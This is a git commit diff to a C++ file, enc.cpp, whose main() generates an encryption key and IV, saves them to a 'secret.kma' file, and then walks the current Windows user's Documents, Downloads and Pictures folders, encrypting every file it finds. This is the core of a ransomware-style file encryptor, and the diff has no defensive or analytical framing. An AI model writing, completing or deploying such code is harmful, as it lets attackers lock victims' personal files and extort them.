30ef432618c07725365e73938313a82355fc7a1c
ng0cph0ng <fogsbuddha@gmail.com>
2024-05-03 21:01:41 +0700

    Update enc.cpp

--- src/enc.cpp
+++ src/enc.cpp
@@ -2,28 +2,30 @@
 
 int main()
 {
-    uint8_t key[16];
-    uint8_t iv[16];
+    if (!filesExist("secret.kma"))
+    {
+        uint8_t key[16];
+        uint8_t iv[16];
 
-    genKeyIfNeeded(key, iv);
+        generateKeyAndIV(key, iv, size);
+        saveKeyAndIVToDesktop("secret.kma", key, iv, size);
 
-    readFromFile(keyFilename, key, size);
-    readFromFile(ivFilename, iv, size);
+        std::string username = getCurrentUsername();
+        std::string path = "C:\\Users\\" + username + "\\";
 
-    std::string username = getCurrentUsername();
-    std::string path = "C:\\Users\\" + username + "\\";
-    
-    // Các thư mục cần xem
-    std::vector<std::string> folders = { "Documents", "Downloads", "Pictures" };
-    
-    for (const auto& folder : folders) {
-        std::string folderPath = path + folder + "\\";
+        // Các thư mục cần xem
+        std::vector<std::string> folders = {"Documents", "Downloads", "Pictures"};
 
-        // Liệt kê các tệp và thư mục trong thư mục hiện tại
-        std::vector<FileItem> items = listFilesAndDirectories(folderPath);
-        
-        enc(items, "", folderPath, key, iv);
+        for (const auto &folder : folders)
+        {
+            std::string folderPath = path + folder + "\\";
+
+            // Liệt kê các tệp và thư mục trong thư mục hiện tại
+            std::vector<FileItem> items = listFilesAndDirectories(folderPath);
+
+            enc(items, "", folderPath, key, iv);
+        }
     }
-    
+
     return 0;
 }
